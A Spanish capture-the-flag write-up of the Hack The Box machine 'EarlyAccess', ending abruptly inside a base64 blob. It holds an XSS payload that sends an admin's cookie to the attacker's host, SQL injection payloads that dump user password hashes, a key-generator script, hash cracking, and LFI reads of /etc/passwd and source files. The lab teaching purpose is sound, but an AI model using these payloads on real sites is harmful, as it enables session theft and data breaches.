---
layout: post
title: EarlyAccess
date: 2023-03-07
description:
img:
fig-caption:
tags: [eCPPTv2, eCPTXv2, OSCP, eWPT, eWPTXv2, OSWE]
---
___

<center><img src="/writeups/assets/img/EarlyAccess-htb/EarlyAccess.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Inyección XSS

* Cookie Hijacking

* Análisis de código en python

* Python Scripting (Nivel Medio - Avanzado)

* SQLi - Error Based

* LFI

* Host Discovering

* Dinamic Port Forwarding

* Information Disclosure

* Pivoting

* Enumeración de Docker

* Abuso de montura

* Abuso de Capabilities (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.110 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-07 10:07 GMT
Nmap scan report for 10.10.11.110
Host is up (0.078s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 12.82 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80,443 10.10.11.110 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-07 10:08 GMT
Nmap scan report for 10.10.11.110
Host is up (0.062s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 e466288ed0bdf31df18d44e9141d9c64 (RSA)
|   256 b3a8f4497a0379d35a1394249b6ad1bd (ECDSA)
|_  256 e9aaae594a3749a65a2a321d7926edbb (ED25519)
80/tcp  open  http     Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to https://earlyaccess.htb/
443/tcp open  ssl/http Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT
| Not valid before: 2021-08-18T14:46:57
|_Not valid after:  2022-08-18T14:46:57
|_http-title: EarlyAccess
Service Info: Host: 172.18.0.102; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.36 seconds
```

Añado el dominio ```earlyaccess.htb``` al ```/etc/hosts```

# Puerto 80 (HTTP) | Puerto 443 (HTTPS)

Con whatweb, analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.11.110
http://10.10.11.110 [301 Moved Permanently] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.10.11.110], RedirectLocation[https://earlyaccess.htb/], Title[301 Moved Permanently]
https://earlyaccess.htb/ [200 OK] Apache[2.4.38], Bootstrap, Cookies[XSRF-TOKEN,earlyaccess_session], Country[RESERVED][ZZ], Email[admin@earlyaccess.htb], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.10.11.110], PHP[7.4.21], Script, Title[EarlyAccess], X-Powered-By[PHP/7.4.21]
```

```null
whatweb https://10.10.11.110
https://10.10.11.110 [200 OK] Apache[2.4.38], Bootstrap, Cookies[XSRF-TOKEN,earlyaccess_session], Country[RESERVED][ZZ], Email[admin@earlyaccess.htb], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.10.11.110], PHP[7.4.21], Script, Title[EarlyAccess], X-Powered-By[PHP/7.4.21]
```

La página principal se ve así:

<img src="/writeups/assets/img/EarlyAccess-htb/1.png" alt="">

Aplico fuzzing para descubrir rutas. Pero hay un WAF que me bloquea

<img src="/writeups/assets/img/EarlyAccess-htb/2.png" alt="">

Hay un panel de inicio de sesión

<img src="/writeups/assets/img/EarlyAccess-htb/3.png" alt="">

En la petición se arrastran varios token y cookies

<img src="/writeups/assets/img/EarlyAccess-htb/4.png" alt="">

La primera está compuesta por varios campos:

<img src="/writeups/assets/img/EarlyAccess-htb/5.png" alt="">

La data no es legible

```null
echo 'O4Nv/mG9B0Z8fRaC94tETw==' | base64 -d; echo
;oaF|}DO
```

```null
echo '0K+7zXN0G4ePF/FBYIiuSketKlGJ37xdJPlllqBbKhNZq1NWaEmzdHxkcm+Vr/ig3v07X4VsoRvdXqGz6ZXhdg+KCMmV5xUE8ssVwnyuUFo9BRd3heCTHAW/2STS0GLf' | base64 -d; echo
ЯstA`JG*Q߼]$e[*YSVhIt|dro;_l
```

Me puedo registrar

<img src="/writeups/assets/img/EarlyAccess-htb/6.png" alt="">

En los CN del certificado SSL se puede ver otro usuario

```null
openssl s_client -connect 10.10.11.110:443 | grep CN
Can't use SSL_get_servername
depth=0 C = AT, ST = Vienna, L = Vienna, O = EarlyAccess Studios, OU = IT, CN = earlyaccess.htb, emailAddress = chr0x6eos@earlyaccess.htb
verify error:num=18:self-signed certificate
verify return:1
depth=0 C = AT, ST = Vienna, L = Vienna, O = EarlyAccess Studios, OU = IT, CN = earlyaccess.htb, emailAddress = chr0x6eos@earlyaccess.htb
verify error:num=10:certificate has expired
notAfter=Aug 18 14:46:57 2022 GMT
verify return:1
depth=0 C = AT, ST = Vienna, L = Vienna, O = EarlyAccess Studios, OU = IT, CN = earlyaccess.htb, emailAddress = chr0x6eos@earlyaccess.htb
notAfter=Aug 18 14:46:57 2022 GMT
verify return:1
 0 s:C = AT, ST = Vienna, L = Vienna, O = EarlyAccess Studios, OU = IT, CN = earlyaccess.htb, emailAddress = chr0x6eos@earlyaccess.htb
   i:C = AT, ST = Vienna, L = Vienna, O = EarlyAccess Studios, OU = IT, CN = earlyaccess.htb, emailAddress = chr0x6eos@earlyaccess.htb
subject=C = AT, ST = Vienna, L = Vienna, O = EarlyAccess Studios, OU = IT, CN = earlyaccess.htb, emailAddress = chr0x6eos@earlyaccess.htb
issuer=C = AT, ST = Vienna, L = Vienna, O = EarlyAccess Studios, OU = IT, CN = earlyaccess.htb, emailAddress = chr0x6eos@earlyaccess.htb
```

Tras crear una cuenta, tengo aceso a otra sección de la web

<img src="/writeups/assets/img/EarlyAccess-htb/7.png" alt="">

Puedo enviar mensajes al usuario Administrador

<img src="/writeups/assets/img/EarlyAccess-htb/8.png" alt="">

Como el nombre de usuario se ver reflejado en la respuesta, puedo intentar algún tipo de inyección, como un SSTI, desde la sección de ajustes del perfil

<img src="/writeups/assets/img/EarlyAccess-htb/9.png" alt="">

En el foro hay varios mensajes

<img src="/writeups/assets/img/EarlyAccess-htb/10.png" alt="">

El primero referencia a un fallo de seguridad en un juego, al cambiar el nombre de usuario

<img src="/writeups/assets/img/EarlyAccess-htb/11.png" alt="">

El segundo dice que hay problemas en la API que se encarga de la verificación en dos pasos. A esta sección si que tengo acceso

<img src="/writeups/assets/img/EarlyAccess-htb/12.png" alt="">

El nombre de usuario es vulnerable a una inyección HTML, al cargarlo desde ```messaging```

<img src="/writeups/assets/img/EarlyAccess-htb/13.png" alt="">

En caso de que al Administrador se le interprete también, puedo tratar de que se me envíe su cookie de sesión a mi equipo

```null
<script>document.location="http://10.10.16.9/?cookie="+document.cookie</script>
```

Al abrir el mensaje recibo su cookie

```null
nc -nlvp 80
listening on [any] 80 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.110] 42380
GET /?cookie=XSRF-TOKEN=eyJpdiI6IlZrWjBUNFdnQ2JqQW5FQXBwdDMraFE9PSIsInZhbHVlIjoieU5DWXhCTzhjQ2l3VS9kRHQ5Q05nRlpXMlpKQ2tpdVFERmhocktMd3psdklMWlZWbWxEcG5sYitSTzhxMmpKVDczTU1FS3RvUkVyRFhTb29kUjhCNmgwV1J2K2dQdENjZzU2czF2MnJKUHhSNUdSUGJyRnZ6Q3dKWWxWRUZ2Z08iLCJtYWMiOiJhOWEwZWViYzEwMjNkMjFmODdhNTBlYzA3NzEyMGFlMjMzNDdkM2UwZTVhOGE2ODk4YTI3ZjllNjVjNTI4MzU5In0%3D;%20earlyaccess_session=eyJpdiI6InMwSXUzQzBadlp4M0Fncmh5OXJDckE9PSIsInZhbHVlIjoiSzNubGJRS29pSXhjSWxYanA3eXRiYTFlMUNuWVVPM1VXTndETjRZbC84RWRTTlF5WS9xU0dQQ3NobFhHOGE2MnUxOEZ0M0M0SjVJbXBqWFM5Q2VHTytiTTFyVHNoc29MaFhrN1RUQmV1RzJpLzd0cEMzQy9IZnlJQ1o4Yk1tVmIiLCJtYWMiOiIxYjIxYjA2YTc4MjEzMGM4ODk1NmIzYmViNGU5ZGIzOWI4ODZhYzQ0ZDdmNWIzOTlhMjUxZjJlMmJmZTQ3MWVkIn0%3D HTTP/1.1
Host: 10.10.16.9
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

Las sustituyo en el Firefox por las mías

<img src="/writeups/assets/img/EarlyAccess-htb/14.png" alt="">

Tengo acceso a varias secciones

<img src="/writeups/assets/img/EarlyAccess-htb/15.png" alt="">

Agrego los subdominos ```dev.earlyaccess.htb``` y ```game.earlyaccess.htb``` al ```/etc/hosts```. Corresponde a un nuevo panel de inicio de sesión

<img src="/writeups/assets/img/EarlyAccess-htb/16.png" alt="">

Puedo descargar un backup del código que se encarga de generar el token

<img src="/writeups/assets/img/EarlyAccess-htb/17.png" alt="">

El formato de la KEY tiene que ser el siguiente:

```null
def valid_format(self) -> bool:
    return bool(match(r"^[A-Z0-9]{5}(-[A-Z0-9]{5})(-[A-Z]{4}[0-9])(-[A-Z0-9]{5})(-[0-9]{1,5})$", self.key))
```

5 caracteres alfanuméricos de la "A" a la "Z", igual para el seguiente campo, después cuatro letras y un número y en el último solo números. Es probable que el que son solo números corresponda a un checksum del resto de la cadena. Un ejemplo de formato sería así: ```AAAAA-BBBBB-CCCC1-DDDDD-1234```. En caso de que el patrón sea correcto, devolverá un ```true```, de lo contrario, un ```false```

La siguiente función es esta:

```null
def g1_valid(self) -> bool:
    g1 = self.key.split('-')[0]
    r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
    if r != [221, 81, 145]:
        return False
    for v in g1[3:]:
        try:
            int(v)
        except:
            return False
    return len(set(g1)) == len(g1)
```

Está separando la cadena tomando como delimitador el "-" para quedarse con el primer argumento. Esto hacen el resto de funciones según la posición. Todo ello lo almacena en la variable ```g1```. Está declarando un bucle con dos variables, ```i``` y ```v```, tomando como argumento los tres primeros caracteres de ```g1```. Por cada iteración, ```v``` va a tener esos valores respectivamente, mientras que ```i``` actua de contador. Por cada valor de ```v```, se está transformando de string a valor decimal y a ese valor le está haciendo un bitwise shift left, con el valor de ```i``` más una unidad, por lo que es bastante probable que el valor inicial de ```i``` sea 0. El bitwise toma el valor decimal para convertirlo a binario y rotarlo una unidad a la izquierda. Luego le está haciendo un módulo con 256 de valor y lo xorea con el caracter correspondiente a ```v```. Todo el output lo está almacenando en la variable ```r```. En caso de que los tres primeros caracteres de la cadena global no sean iguales a 221, 81 y 145, toda la validación va a devolver un false, por lo que el programa no avanza.

Puedo tratar de reversar estos tres valores, creando una tabla por la que iterar y me lo devuelva en caso de que coincida

```null
import sys, string, signal

def def_handler(sig, frame):
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

def g1():

    if len(sys.argv) != 2:
        sys.exit(1)

    i = int(sys.argv[1])

    characters = string.ascii_uppercase + string.digits
    
    for character in characters:
       r = (ord(character)<<i+1)%256^ord(character)
       print("%s: %s" % (character, r))
    

if __name__ == '__main__':
    g1()
```

Por tanto, los tres caracteres que pasan la primera validatoria son:

```null
python3 decrypt.py 0 | grep 221
K: 221
python3 decrypt.py 1 | grep 81
E: 81
python3 decrypt.py 2 | grep 145
Y: 145
```

Para los otros dos caracteres es más sencillo, ya que únicamente comprueba que es un entero. Hay una función ```check``` que se encarga de llamar al resto de comprobaciones

```null

 def check(self) -> bool:
     if not self.valid_format():
         print('Key format invalid!')
         return False
     if not self.g1_valid():
         return False
     if not self.g2_valid():
         return False
     if not self.g3_valid():
         return False
     if not self.g4_valid():
         return False
     if not self.cs_valid():
         print('[Critical] Checksum verification failed!')
         return False
     return True
```

La segunda comprobación es:

```null
def g2_valid(self) -> bool:
    g2 = self.key.split('-')[1]
    p1 = g2[::2]
    p2 = g2[1::2]
    return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))
```

En ```p1``` está almacenando las posiciones impares y en ```p2``` las pares

```null
❯ python3
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> string = "ABCDEF"
>>> string[::2]
'ACE'
>>> string[1::2]
'BDF'
```

Cuando aplica el sum(bytearray) está sumando cada caracter de los valores impares en formato bytes

```null
>>> p1 = string[::2]
>>> sum(bytearray(p1.encode()))
201
```

Solo va a devolver valores esta función en caso de que la sumatoria sea igual para las posiciones pares y las impares. Creo otro nueva función que se encargue de darme un valor válido

```null
def g2():
    from itertools import product
    p1 = product(string.ascii_uppercase + string.digits, repeat=3)
    p1 = [ "".join(i) for i in p1]

    p2 = product(string.ascii_uppercase + string.digits, repeat=2)
    p2 = [ "".join(i) for i in p2]

    for x in p1:
        for y in p2:
            if sum(bytearray(x.encode())) == sum(bytearray(y.encode())):
                code = x[0] + y[0] + x[1] + y[1] + x[2]
                print(code)
                sys.exit(0)
```

```null
python3 decrypt.py
AXAZ0
```

La tercera función es asi:

```null
def g3_valid(self) -> bool:
    # TODO: Add mechanism to sync magic_num with API
    g3 = self.key.split('-')[2]
    if g3[0:2] == self.magic_value:
        return sum(bytearray(g3.encode())) == self.magic_num
    else:
        return False
```

En este caso, los cuatro primeros caracteres son letras, pero el último es un número. Se está quedando con los dos primeros caracteres para comparrlos con ```magic_value```

```null
>>> string[0:2]
'AB
```

Los atributos de ```self``` están definidos en una clase al comienzo del script

```null
class Key:
    key = ""
    magic_value = "XP" # Static (same on API)
    magic_num = 346 # TODO: Sync with API (api generates magic_num every 30min)

    def __init__(self, key:str, magic_num:int=346):
        self.key = key
        if magic_num != 0:
            self.magic_num = magic_num
```

Está volviendo a aplicar una sumatoria de todos esos caracteres para compararlos con ```magic_num```, que es 346. En el ```decrypt.py```, para evitar ruido, utilizo diccionarios para que en caso de que un valor tenga la misma suma, lo sobrescriba y quedarme con los únicos. En total hay un máximo de 60 combinaciones. Como el valor de la API no es estático, tengo que probar todas para llegar a la válida (Se modifica cada media hora)

```null
def g3():
    from itertools import product
    p1 = product(string.ascii_uppercase, repeat=2)
    p1 = [ "".join(i) for i in p1 ]

    uniques = {}

    for x in p1:
        for y in range(0, 10):
            g3 = f"XP{x}{y}"
            value = sum(bytearray(g3.encode()))

            uniques[value] = g3
    print("\n".join(uniques.values()))
```

```null
python3 decrypt.py | xargs
XPAA0 XPBA0 XPCA0 XPDA0 XPEA0 XPFA0 XPGA0 XPHA0 XPIA0 XPJA0 XPKA0 XPLA0 XPMA0 XPNA0 XPOA0 XPPA0 XPQA0 XPRA0 XPSA0 XPTA0 XPUA0 XPVA0 XPWA0 XPXA0 XPYA0 XPZA0 XPZB0 XPZC0 XPZD0 XPZE0 XPZF0 XPZG0 XPZH0 XPZI0 XPZJ0 XPZK0 XPZL0 XPZM0 XPZN0 XPZO0 XPZP0 XPZQ0 XPZR0 XPZS0 XPZT0 XPZU0 XPZV0 XPZW0 XPZX0 XPZY0 XPZZ0 XPZZ1 XPZZ2 XPZZ3 XPZZ4 XPZZ5 XPZZ6 XPZZ7 XPZZ8 XPZZ9
```

La cuarta función consiste en lo siguiente:

```null
def g4_valid(self) -> bool:
    return [ord(i)^ord(g) for g, i in zip(self.key.split('-')[0], self.key.split('-')[3])] == [12, 4, 20, 117, 0]
```

Está qudandose con el primer argumento tomando como delimitador el "-", y lo mismo para la tercera, almacenándolas en distintas variables, xoreando cada caracter, ```i```, sobre ```g```,  y comparando cada valor respectivamente sobre 12, 4, 20, 117 y 0. Con xor, se puede aplicar el proceso inverso para obtener el valor que desconozco

```null
python3
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> chr(ord("K")^12)
'G'
>>> chr(ord("E")^4)
'A'
>>> chr(ord("Y")^20)
'M'
>>> chr(ord("1")^117)
'D'
>>> chr(ord("2")^0)
'2'
```

Solo falta obtener el checksum

```null
def calc_cs(self) -> int:
    gs = self.key.split('-')[:-1]
    return sum([sum(bytearray(g.encode())) for g in gs])
```

El script final quedaría así:

```null
from itertools import product
import sys, string, signal

def def_handler(sig, frame):
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

def g1():

    if len(sys.argv) != 2:
        sys.exit(1)

    i = int(sys.argv[1])

    characters = string.ascii_uppercase + string.digits
    
    for character in characters:
       r = (ord(character)<<i+1)%256^ord(character)
       print("%s: %s" % (character, r))
    

def g2():
    p1 = product(string.ascii_uppercase + string.digits, repeat=3)
    p1 = [ "".join(i) for i in p1 ]

    p2 = product(string.ascii_uppercase + string.digits, repeat=2)
    p2 = [ "".join(i) for i in p2 ]

    for x in p1:
        for y in p2:
            if sum(bytearray(x.encode())) == sum(bytearray(y.encode())):
                code = x[0] + y[0] + x[1] + y[1] + x[2]
                print(code)
                sys.exit(0)

def g3():
    p1 = product(string.ascii_uppercase, repeat=2)
    p1 = [ "".join(i) for i in p1 ]

    uniques = {}

    for x in p1:
        for y in range(0, 10):
            g3 = f"XP{x}{y}"
            value = sum(bytearray(g3.encode()))

            uniques[value] = g3
    #print("\n".join(uniques.values()))

    return uniques.values()


def calc_cs(key) -> int:
    gs = key.split('-')[:-1]
    return sum([sum(bytearray(g.encode())) for g in gs])

def coder():
    values = g3()
    
    total_keys = []

    for value in values:
        key = ("KEY12-AXAZ0-%s-GAMD2-" % (value))
        checksum = calc_cs(key)
        key = ("%s%s" % (key, checksum))

        total_keys.append(key)
    
    return total_keys


if __name__ == '__main__':
    keys = coder()
    for key in keys:
        print(key)
```

Aunque cumplan todas las condiciones, no tienen por qué ser válidas

<img src="/writeups/assets/img/EarlyAccess-htb/18.png" alt="">

```null
python3 decrypt.py
[+] Bruteforcing...: [+] KEY KEY12-AXAZ0-XPVA0-GAMD2-1386
```

Teniendo el código, puedo acceder al juego

<img src="/writeups/assets/img/EarlyAccess-htb/19.png" alt="">

En el foro habían reportado una vulnerabilidad. Al modificar el nombre de usuario, se pueden provocar inyecciones. Introduzco una comilla en mi nombre, y se ve reflejado un error de ```MySQL```

<img src="/writeups/assets/img/EarlyAccess-htb/20.png" alt="">

Tiene un total de 3 columnas

```null
rubbx') order by 3-- -
```

Aplico un ordenamiento

```null
rubbx') union select 1,2,3-- -
```

Tiene un total de dos bases de datos

```null
rubbx') union select 1,2,group_concat(schema_name) from information_schema.schemata-- -
```

```null
curl -s -X GET http://game.earlyaccess.htb/scoreboard.php -H "Cookie: PHPSESSID=8d543d06b09287fed7280fa4816f3a1c" | grep -oP '<td>.*?</td>' | head -n 1 | sed 's/<td>//' | sed 's/<\/td>//'
information_schema,db
```

Listo las tablas para ```db```

```null
rubbx') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='db'-- -
```

```null
curl -s -X GET http://game.earlyaccess.htb/scoreboard.php -H "Cookie: PHPSESSID=8d543d06b09287fed7280fa4816f3a1c" | grep -oP '<td>.*?</td>' | head -n 1 | sed 's/<td>//' | sed 's/<\/td>//'
failed_logins,scoreboard,users
```

Para ```users``` las columnas

```null
rubbx') union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='db' and table_name='users'-- -
```

```null
curl -s -X GET http://game.earlyaccess.htb/scoreboard.php -H "Cookie: PHPSESSID=8d543d06b09287fed7280fa4816f3a1c" | grep -oP '<td>.*?</td>' | head -n 1 | sed 's/<td>//' | sed 's/<\/td>//'
id,name,email,password,role,key,created_at,updated_at
```

Me quedo con el email y la contraseña

```null
rubbx') union select 1,2,group_concat(email,':',password) from users-- -
```

```null
curl -s -X GET http://game.earlyaccess.htb/scoreboard.php -H "Cookie: PHPSESSID=8d543d06b09287fed7280fa4816f3a1c" | grep -oP '<td>.*?</td>' | head -n 1 | sed 's/<td>//' | sed 's/<\/td>//' | tr ',' '\n'
admin@earlyaccess.htb:618292e936625aca8df61d5fff5c06837c49e491
chr0x6eos@earlyaccess.htb:d997b2a79e4fc48183f59b2ce1cee9da18aa5476
firefart@earlyaccess.htb:584204a0bbe5e392173d3dfdf63a322c83fe97cd
farbs@earlyaccess.htb:290516b5f6ad161a86786178934ad5f933242361
rubbx@earlyaccess.htb:76712d547d021cfb0412c0b121da35330ebb24fc
```

Los intento crackear con john (menos el mío, que no tiene sentido)

```null
ohn -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-SHA1-AxCrypt
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (Raw-SHA1-AxCrypt [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
gameover         (admin@earlyaccess.htb)     
1g 0:00:00:00 DONE (2023-03-07 19:57) 1.333g/s 19124Kp/s 19124Kc/s 57382KC/sie168..*7¡Vamos!
Use the "--show --format=Raw-SHA1-AxCrypt" options to display all of the cracked passwords reliably
Session completed. 
```

La utilizo para conectarme al panel de autenticación del ```dev.earlyaccess.htb```. Me tuve que cambiar a ```Chromium``` porque el ```Firefox``` daba problemas. En el histórico en ```BurpSuite``` se puede ver que tramita una petición a ```/actions```

<img src="/writeups/assets/img/EarlyAccess-htb/21.png" alt="">

Aplico fuzzing sobre ```/actions```

```null
gobuster dir -u http://dev.earlyaccess.htb/actions -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 -x php -H "Cookie: PHPSESSID=24b99e5ad2237736351f97ea807bda78"
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.earlyaccess.htb/actions
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/03/07 20:11:32 Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 302) [Size: 0] [--> /index.php]
/file.php             (Status: 500) [Size: 35]                
/logout.php           (Status: 302) [Size: 0] [--> /home.php] 
/hash.php             (Status: 302) [Size: 0] [--> /home.php] 
```

El archivo ```file.php``` devuelve un código de estado 500

```null
wfuzz -c --hh=35 -t 200 -H "Cookie: PHPSESSID=24b99e5ad2237736351f97ea807bda78" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt 'http://dev.earlyaccess.htb/actions/file.php?FUZZ=../../../../../etc/passwd'
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.earlyaccess.htb/actions/file.php?FUZZ=../../../../../etc/passwd
Total requests: 6453

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000002241:   500        0 L      10 W       89 Ch       "filepath"                                                                                                                                     

Total time: 20.28695
Processed Requests: 6453
Filtered Requests: 6452
Requests/sec.: 318.0861
```

El parámetro ```?filepath``` existe. Puedo obtener el contendio de ```hash.php```

```null
curl -s -X GET 'http://dev.earlyaccess.htb/actions/file.php?filepath=php://filter/convert.base64-encode/resource=hash.php' -H "Cookie: PHPSESSID=24b99e5ad2237736351f97ea807bda78"
<h2>Executing file:</h2><p>php://filter/convert.base64-encode/resource=hash.php</p><br>PD9waHAKaW5jbHVkZV9vbmNlICIuLi9pbmNsdWRlcy9zZXNzaW9uLnBocCI7CgpmdW5jdGlvbiBoYXNoX3B3KCRoYXNoX2Z1bmN0aW9uLCAkcGFzc3dvcmQpCnsKICAgIC8vIERFVkVMT1BFUi1OT1RFOiBUaGVyZSBoYXMgZ290dGEgYmUgYW4gZWFzaWVyIHdheS4uLgogICAgb2Jfc3RhcnQoKTsKICAgIC8vIFVzZSBpbnB1dHRlZCBoYXNoX2Z1bmN0aW9uIHRvIGhhc2ggcGFzc3dvcmQKICAgICRoYXNoID0gQCRoYXNoX2Z1bmN0aW9uKCRwYXNzd29yZCk7CiAgICBvYl9lbmRfY2xlYW4oKTsKICAgIHJldHVybiAkaGFzaDsKfQoKdHJ5CnsKICAgIGlmKGlzc2V0KCRfUkVRVUVTVFsnYWN0aW9uJ10pKQogICAgewogICAgICAgIGlmKCRfUkVRVUVTVFsnYWN0aW9uJ10gPT09ICJ2ZXJpZnkiKQogICAgICAgIHsKICAgICAgICAgICAgLy8gVkVSSUZJRVMgJHBhc3N3b3JkIEFHQUlOU1QgJGhhc2gKCiAgICAgICAgICAgIGlmKGlzc2V0KCRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddKSAmJiBpc3NldCgkX1JFUVVFU1RbJ2hhc2gnXSkgJiYgaXNzZXQoJF9SRVFVRVNUWydwYXNzd29yZCddKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgLy8gT25seSBhbGxvdyBjdXN0b20gaGFzaGVzLCBpZiBgZGVidWdgIGlzIHNldAogICAgICAgICAgICAgICAgaWYoJF9SRVFVRVNUWydoYXNoX2Z1bmN0aW9uJ10gIT09ICJtZDUiICYmICRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddICE9PSAic2hhMSIgJiYgIWlzc2V0KCRfUkVRVUVTVFsnZGVidWcnXSkpCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigiT25seSBNRDUgYW5kIFNIQTEgYXJlIGN1cnJlbnRseSBzdXBwb3J0ZWQhIik7CgogICAgICAgICAgICAgICAgJGhhc2ggPSBoYXNoX3B3KCRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddLCAkX1JFUVVFU1RbJ3Bhc3N3b3JkJ10pOwoKICAgICAgICAgICAgICAgICRfU0VTU0lPTlsndmVyaWZ5J10gPSAoJGhhc2ggPT09ICRfUkVRVUVTVFsnaGFzaCddKTsKICAgICAgICAgICAgICAgIGhlYWRlcignTG9jYXRpb246IC9ob21lLnBocD90b29sPWhhc2hpbmcnKTsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlaWYoJF9SRVFVRVNUWydhY3Rpb24nXSA9PT0gInZlcmlmeV9maWxlIikKICAgICAgICB7CiAgICAgICAgICAgIC8vVE9ETzogSU1QTEVNRU5UIEZJTEUgVkVSSUZJQ0FUSU9OCiAgICAgICAgfQogICAgICAgIGVsc2VpZigkX1JFUVVFU1RbJ2FjdGlvbiddID09PSAiaGFzaF9maWxlIikKICAgICAgICB7CiAgICAgICAgICAgIC8vVE9ETzogSU1QTEVNRU5UIEZJTEUtSEFTSElORwogICAgICAgIH0KICAgICAgICBlbHNlaWYoJF9SRVFVRVNUWydhY3Rpb24nXSA9PT0gImhhc2giKQogICAgICAgIHsKICAgICAgICAgICAgLy8gSEFTSEVTICRwYXNzd29yZCBVU0lORyAkaGFzaF9mdW5jdGlvbgoKICAgICAgICAgICAgaWYoaXNzZXQoJF9SRVFVRVNUWydoYXNoX2Z1bmN0aW9uJ10pICYmIGlzc2V0KCRfUkVRVUVTVFsncGFzc3dvcmQnXSkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIC8vIE9ubHkgYWxsb3cgY3VzdG9tIGhhc2hlcywgaWYgYGRlYnVnYCBpcyBzZXQKICAgICAgICAgICAgICAgIGlmKCRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddICE9PSAibWQ1IiAmJiAkX1JFUVVFU1RbJ2hhc2hfZnVuY3Rpb24nXSAhPT0gInNoYTEiICYmICFpc3NldCgkX1JFUVVFU1RbJ2RlYnVnJ10pKQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oIk9ubHkgTUQ1IGFuZCBTSEExIGFyZSBjdXJyZW50bHkgc3VwcG9ydGVkISIpOwoKICAgICAgICAgICAgICAgICRoYXNoID0gaGFzaF9wdygkX1JFUVVFU1RbJ2hhc2hfZnVuY3Rpb24nXSwgJF9SRVFVRVNUWydwYXNzd29yZCddKTsKICAgICAgICAgICAgICAgIGlmKCFpc3NldCgkX1JFUVVFU1RbJ3JlZGlyZWN0J10pKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGVjaG8gIlJlc3VsdCBmb3IgSGFzaC1mdW5jdGlvbiAoIiAuICRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddIC4gIikgYW5kIHBhc3N3b3JkICgiIC4gJF9SRVFVRVNUWydwYXNzd29yZCddIC4gIik6PGJyPiI7CiAgICAgICAgICAgICAgICAgICAgZWNobyAnPGJyPicgLiAkaGFzaDsKICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7C